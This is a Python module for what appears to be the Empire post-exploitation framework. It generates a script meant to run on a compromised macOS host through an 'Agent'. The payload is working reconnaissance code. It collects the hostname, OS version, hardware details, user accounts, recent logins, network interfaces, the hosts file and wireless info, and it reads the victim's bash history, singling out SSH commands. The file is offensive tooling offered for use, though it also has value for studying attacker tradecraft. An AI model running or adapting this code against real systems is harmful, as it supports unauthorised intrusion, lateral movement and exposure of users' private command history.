class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'Situational Awareness',
            'Author': ['Alex Rymdeko-Harvey', '@Killswitch-GUI'],
            'Description': 'This module will enumerate the basic items needed for OP.',
            'Background' : False,
            'OutputExtension' : "",
            'NeedsAdmin' : False,
            'OpsecSafe' : True,
            'Language' : 'python',
            'MinLanguageVersion' : '2.6',
            'Comments': [
                ''
            ]
        }
        self.options = {
            'Agent' : {
                'Description'   :   'Agent to run from.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'HistoryCount' : {
                'Description'   :   'The number of messages to enumerate from most recent.',
                'Required'      :   True,
                'Value'         :   '10'
            },
            'Debug' : {
                'Description'   :   'Enable a find keyword to search for within the iMessage Database.',
                'Required'      :   True,
                'Value'         :   'False'
            }
        }
        self.mainMenu = mainMenu
        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        script = ''
        if self.options['Debug']['Value']:
            debug = self.options['Debug']['Value']
            script += "Debug = " + str(debug) + '\n'
        if self.options['HistoryCount']['Value']:
            search = self.options['HistoryCount']['Value']
            script += 'HistoryCount = ' + str(search) + '\n'
        script += """
try:
    import subprocess
    import sys
    import os
    import time
    from os.path import expanduser
    home = str(expanduser("~"))
    sudo = True
    process = subprocess.Popen('which sudo|wc -l', stdout=subprocess.PIPE, shell=True)
    result = process.communicate()
    result = result[0].strip()
    if str(result) != "1":
        print "[!] ERROR some shit requires (sudo) privileges!"
        sudo = False
        sys.exit()
    try:
        process = subprocess.Popen('hostname', stdout=subprocess.PIPE, shell=True)
        hostname = process.communicate()
        hostname = hostname[0].strip()
        print "[*] Hostname:"
        print " - " + str(hostname.strip())
    except Exception as e:
        if Debug:
            print "[!] Error enumerating hostname: " + str(e)
        pass
    try:
        process = subprocess.Popen('sw_vers -productVersion', stdout=subprocess.PIPE, shell=True)
        swvers = process.communicate()
        swvers = swvers[0].strip()
        print "[*] MAC OS Package Level:"
        print " - " + str(swvers.strip())
    except Exception as e:
        if Debug:
            print "[!] Error enumerating OS Package: " + str(e)
        pass
    try:
        process = subprocess.Popen("system_profiler SPHardwareDataType", stdout=subprocess.PIPE, shell=True)
        ho = process.communicate()
        ho = ho[0].split('\\n')
        print "[*] Hardware Overview:"
        for x in ho[4:]:
            if x:
                print " - " + str(x.strip())
    except Exception as e:
        if Debug:
            print "[!] Error enumerating Hardware Overview: " + str(e)
    try:
        process = subprocess.Popen("dscacheutil -q user | grep -A 3 -B 2 -e uid:\ 5'[0-9][0-9]'", stdout=subprocess.PIPE, shell=True)
        users = process.communicate()
        users = users[0].split('\\n')
        print "[*] Client Users:"
        for x in users:
            if x:
                print " - " + str(x.strip())
            else:
                print
    except Exception as e:
        if Debug:
            print "[!] Error enumerating OS Package: " + str(e)
        pass
    try:
        print "[*] Last Logins:"
        process = subprocess.Popen("last -10", stdout=subprocess.PIPE, shell=True)
        last = process.communicate()
        last = last[0].split('\\n')
        for x in last:
            if x.startswith('wtmp'):
                break
            if x:
                print " - " + str(x.strip())
    except Exception as e:
        if Debug:
            print "[!] Error Enumerating en0: " + str(e)
        pass
    try:
        process = subprocess.Popen("networksetup -listallhardwareports", stdout=subprocess.PIPE, shell=True)
        hardware = process.communicate()
        hardware = hardware[0].split('\\n')
        print "[*] Installed Interfaces:"
        for x in hardware:
            if x:
                print " - " + str(x.strip())
            else:
                print
    except Exception as e:
        if Debug:
            print "[!] Error Enumerating Installed Interfaces: " + str(e)
        pass
    try:
        process = subprocess.Popen("ipconfig getpacket en0", stdout=subprocess.PIPE, shell=True)
        inf = process.communicate()
        inf = inf[0].split('\\n')
        print "[*] en0 Interface:"
        for x in inf:
            if x:
                print " - " + str(x.strip())
            else:
                print
    except Exception as e:
        if Debug:
            print "[!] Error Enumerating en0: " + str(e)
        pass
    try:
        process = subprocess.Popen("cat /private/etc/hosts", stdout=subprocess.PIPE, shell=True)
        hosts = process.communicate()
        hosts = hosts[0].split('\\n')
        print "[*] DNS Hosts File:"
        for x in hosts:
            if x:
                if x.startswith("#"):
                    pass
                else:
                    print " - " + str(x.strip())
            else:
                print
    except Exception as e:
        if Debug:
            print "[!] Error Enumerating Hosts File: " + str(e)
        pass
    try:
        location = home + "/.bash_history"
        with open(location, 'r') as myfile:
            HistoryResult = myfile.readlines()
        HistoryCount = HistoryCount * -1
        print "[*] Enumerating User Bash History"
        print " - History count size: " + str(len(HistoryResult))
        for item in HistoryResult[HistoryCount:]:
            print "    * " + str(item.strip())
        print "[*] SSH commands in History: "
        for item in HistoryResult:
            if "ssh" in item.lower():
                print "    * " + str(item.strip())
    except Exception as e:
        if Debug:
            print "[!] Error enumerating user bash_history: " + str(e)
        pass
    try:
        process = subprocess.Popen(executable="/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport", args="-I", stdout=subprocess.PIPE, shell=True)
        wireless = process.communicate()
        if wireless[0] != '':
            wireless = wireless[0].split('\\n')
            print "[*] Wireless Connectivity Info:"
            for x in wireless:
                if x:
                    print " - " + str(x.strip())
                else:
                    print
    except Exception as e:
        if Debug:
            print "[!] Error enumerating user Wireless Connectivity Info: " + str(e)
        pass         
except Exception as e:
    print e"""
        return script